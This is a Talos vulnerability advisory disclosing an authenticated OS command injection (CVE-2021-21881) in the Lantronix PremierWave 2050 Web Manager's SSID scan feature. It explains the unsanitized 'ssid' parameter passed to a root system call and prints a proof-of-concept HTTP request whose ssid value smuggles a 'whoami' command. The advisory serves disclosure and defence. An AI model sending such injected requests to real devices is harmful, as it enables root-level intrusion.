# Talos Vulnerability Report

### TALOS-2021-1325

## Lantronix PremierWave 2050 Web Manager Wireless Network Scanner OS command injection vulnerability

##### November 15, 2021

##### CVE Number

CVE-2021-21881

### Summary

An OS command injection vulnerability exists in the Web Manager Wireless Network Scanner functionality of Lantronix PremierWave 2050 8.9.0.0R4. A specially-crafted HTTP request can lead to command execution. An attacker can make an authenticated HTTP request to trigger this vulnerability.

### Tested Versions

Lantronix PremierWave 2050 8.9.0.0R4 (in QEMU)

### Product URLs

<https://www.lantronix.com/products/premierwave2050/>

### CVSSv3 Score

9.9 - CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

### CWE

CWE-78 - Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)

### Details

PremierWave 2050 is an embedded Wi-Fi Module manufactured by Lantronix.

The PremierWave2050 Web Manager provides a “WLAN Scan/QuickConnect” interface that allows an unprivileged, authenticated user to scan for and connect to nearby Wi-Fi networks. It also allows the user to specify the name of a particular SSID for which to search. This search feature is implemented using a `system` call to to the `/usr/sbin/wpa_cli` application, and the underlying command is built using an unsanitized and attacker-controlled HTTP parameter, `ssid`. This command is executed with root privileges.

The relevant portions of the function responsible for handling the `WLANScanSSID` ajax endpoint are included below.

```
ssid = get_POST_parameter("ssid");
...
snprintf(
    cmd,
    0x100u,
    "/usr/sbin/wpa_cli -i wlan0 scan_results 2>/dev/null | tail -n+2 | awk -F'\\t' '{IGNORECASE=0}{ if( ($5 ~ \"%s\") ) print}'",
    ssid);
exec_system_cmd_ex(cmd, &result, &num_bytes);

```

The following HTTP request triggers the vulnerability by attempting to execute a WLAN Scan with a malicious `ssid` field.

```
POST / HTTP/1.1
Host: [IP]:[PORT]
Content-Length: 97
Authorization: Basic dXNlcjp1c2Vy
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

ajax=WLANScanSSID&iehack=&Scan=Scan&netnumber=1&2=link&3=3&ssid="'; whoami #

```

The above request results in the execution of the following command:

```
 /usr/sbin/wpa_cli -i wlan0 scan_results 2>/dev/null | tail -n+2 | awk -F'\t' '{IGNORECASE=0}{ if ( ($5 ~ ""; whoami #

```
